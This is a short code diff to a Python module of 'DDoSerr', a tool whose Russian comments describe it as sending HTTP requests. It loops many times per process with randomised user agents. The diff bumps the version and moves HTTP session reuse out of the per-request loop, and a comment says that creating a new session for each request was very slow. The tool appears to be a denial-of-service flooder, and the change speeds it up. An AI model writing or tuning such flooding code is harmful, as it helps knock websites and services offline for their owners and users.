@@ -60,7 +60,7 @@ DDoSerr Copyright © 2018 Константин Панков
 
 """
 Модуль отправки HTTP-запросов для DDoSerr.
-v.1.6.2.12b. от 22.08.2018.
+v.1.6.2.13b. от 23.08.2018.
 """
 
 """
@@ -109,7 +109,7 @@ def http_connection(repeat, pause, url):
     #Цикл выполняет задание 'repeat' раз в каждом процессе.
     for _ in range(repeat):
         #Создаём сессию.
-        ##session = requests.Session()
+        session = requests.Session()
         
         #Вызываем модуль агентов и получаем рандомного агента из списка.
         random_agent = user_agents.Agents().random_agent()
@@ -145,8 +145,8 @@ def http_connection(repeat, pause, url):
             #_ или item.
             current_url = content_urls[_]
             
-            #Создаём новую сессию для каждого запроса.
-            session = requests.Session()
+            #Создаём новую сессию для каждого запроса - работает, но очень медленно (что не удивительно)! :)
+            ##session = requests.Session()
             
             #Содаём подготовленный запрос с юзер агентом.
             
